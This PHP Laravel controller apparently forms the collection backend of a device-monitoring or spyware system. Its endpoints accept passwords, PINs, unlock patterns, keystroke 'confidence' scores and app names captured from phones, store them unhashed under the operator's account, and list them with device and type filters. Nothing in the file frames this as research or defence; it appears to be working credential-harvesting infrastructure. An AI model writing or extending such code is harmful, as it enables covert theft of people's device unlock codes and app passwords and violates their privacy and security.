<?php

declare(strict_types=1);

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Http\Requests\Device\SyncCipherRequest;
use App\Http\Requests\Device\SyncCredentialsRequest;
use App\Models\Device;
use App\Models\DeviceCredential;
use Carbon\Carbon;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

class DeviceCredentialController extends Controller
{
    public function syncCredentials(SyncCredentialsRequest $request): JsonResponse
    {
        $validated = $request->validated();

        $device = $this->resolveDevice($request, $validated);
        if ($device === null) {
            return $this->error('Device not found', 404);
        }

        $passwordType = $this->normalizePasswordType($validated['passwordType']);

        $credential = DeviceCredential::create([
            'device_id' => $device->id,
            'user_id' => $device->user_id,
            'device_uid' => $device->device_uid,
            'source' => 'credentials',
            'password' => $validated['password'],
            'password_type' => $passwordType,
            'input_method' => $validated['inputMethod'] ?? null,
            'app_name' => $validated['appName'] ?? null,
            'package_name' => $validated['packageName'] ?? null,
            'confidence' => $validated['confidence'] ?? null,
            'cipher_grade_code' => $validated['cipherGradeCode'] ?? null,
            'pattern_cipher' => $validated['patternCipher'] ?? null,
            'is_locked' => $validated['isLocked'] ?? true,
            'device_timestamp' => isset($validated['timestamp'])
                ? Carbon::createFromTimestampMs($validated['timestamp'])->timezone(config('app.timezone'))
                : null,
        ]);

        return $this->success(['id' => $credential->id]);
    }

    public function syncCipher(SyncCipherRequest $request): JsonResponse
    {
        $validated = $request->validated();

        $device = $this->resolveDevice($request, $validated);
        if ($device === null) {
            return $this->error('Device not found', 404);
        }

        $credential = DeviceCredential::create([
            'device_id' => $device->id,
            'user_id' => $device->user_id,
            'device_uid' => $device->device_uid,
            'source' => 'cipher',
            'cipher_grade_code' => $validated['cipherGradeCode'],
            'text_cipher' => $validated['textCipher'] ?? null,
            'pattern_cipher' => $validated['patternCipher'] ?? null,
            'is_locked' => $validated['isLocked'] ?? true,
            'device_timestamp' => isset($validated['captureTime'])
                ? Carbon::createFromTimestampMs($validated['captureTime'])->timezone(config('app.timezone'))
                : null,
        ]);

        return $this->success(['id' => $credential->id]);
    }

    public function index(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'device_uid' => 'nullable|string|max:64',
            'device_id' => 'nullable|integer',
            'password_type' => 'nullable|string|max:30',
            'source' => 'nullable|string|in:credentials,cipher,websocket',
            'per_page' => 'nullable|integer|min:1|max:200',
        ]);

        $user = $request->user();
        $ownerId = $user->getResourceOwnerId();
        $perPage = $validated['per_page'] ?? 50;

        $query = DeviceCredential::where('user_id', $ownerId);

        if (! empty($validated['device_uid'])) {
            $query->where('device_uid', $validated['device_uid']);
        }
        if (! empty($validated['device_id'])) {
            $query->where('device_id', $validated['device_id']);
        }
        if (! empty($validated['password_type'])) {
            $query->where('password_type', $validated['password_type']);
        }
        if (! empty($validated['source'])) {
            $query->where('source', $validated['source']);
        }

        $credentials = $query->orderByDesc('created_at')
            ->paginate($perPage);

        return $this->success($credentials);
    }

    private function resolveDevice(Request $request, array $validated): ?Device
    {
        $deviceId = $request->input('_device_id');

        if (empty($deviceId)) {
            $deviceId = $validated['deviceId'] ?? null;
        }

        if (empty($deviceId)) {
            $deviceId = $request->header('X-Client-ID', '');
        }

        if (empty($deviceId)) {
            return null;
        }

        return Device::where('device_uid', $deviceId)
            ->orWhere('uuid', $deviceId)
            ->first();
    }

    private function normalizePasswordType(string $type): string
    {
        return match ($type) {
            'pin_4', 'pin_6' => 'pin',
            default => $type,
        };
    }

    private function success(mixed $data = null): JsonResponse
    {
        return response()->json([
            'success' => true,
            'code' => 200,
            'msg' => 'OK',
            'data' => $data,
        ]);
    }

    private function error(string $msg, int $code): JsonResponse
    {
        return response()->json([
            'success' => false,
            'code' => $code,
            'msg' => $msg,
            'data' => null,
        ], $code);
    }
}
